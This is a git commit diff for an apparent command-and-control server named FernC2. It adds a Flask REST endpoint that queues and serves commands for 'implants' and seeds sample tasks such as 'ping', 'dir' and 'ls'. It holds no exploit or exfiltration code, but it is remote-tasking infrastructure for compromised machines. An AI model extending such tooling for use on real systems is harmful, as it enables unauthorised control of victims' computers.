d92911aff4e8f949359e00027dd1c99210fcc023
Kibov <bartek01322@gmail.com>
2023-08-08 13:37:39 +0200

    api implementation

--- Server/FernC2.py
+++ Server/FernC2.py
@@ -1,21 +1,49 @@
-from flask import Flask, render_template
+from flask import Flask, request
+from flask_restful import Api, Resource
+
 import sqlite3
 
 
+class Tasks(Resource):
+    def get(self):
+        conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("SELECT * FROM tasks WHERE executed IS NOT 1")
+        rows = cursor.fetchall()
 
-app = Flask(__name__)
+        tasks = [dict(row) for row in rows]
+
+        conn.close()
+
+        return tasks, 200
+    def post(self):
+        try:
+            data = request.get_json()
+            implant_id = data['implant_id']
+            command = data['command']
+
+            conn = get_db_connection()
+            cursor = conn.cursor()
+            cursor.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", (implant_id, command))
+            conn.commit()
+            conn.close()
+            return "Task added successfully!", 201
+        except Exception as e:
+            return {"Error": str(e)}, 500
+            
 
 def get_db_connection():
     conn = sqlite3.connect('c2data.db')
     conn.row_factory = sqlite3.Row
     return conn
 
-@app.route("/")
-def index():
-    conn = get_db_connection()
-    tasks = conn.execute('SELECT * FROM tasks').fetchall()
-    conn.close()
-    return render_template('index.html', tasks=tasks)
+
+app = Flask(__name__)
+api = Api(app)
+
+
+api.add_resource(Tasks, '/tasks', endpoint='tasks')
+
 
 if __name__ == "__main__":
     app.run(debug=True)
--- Server/init_db.py
+++ Server/init_db.py
@@ -8,8 +8,9 @@ with open('schema.sql') as f:
 cur = connection.cursor()
 
 cur.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", ('implant1', 'ping'))
-cur.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", ('implant1', 'dir'))
-cur.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", ('implant1', 'ls'))
+cur.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", ('implant3', 'dir'))
+cur.execute("INSERT INTO tasks (implant_id, command) VALUES (?, ?)", ('implant4', 'ls'))
+cur.execute("INSERT INTO tasks (implant_id, command, executed) VALUES (?, ?, ?)", ('implant2', 'ls', 1))
 
 connection.commit()
 connection.close()
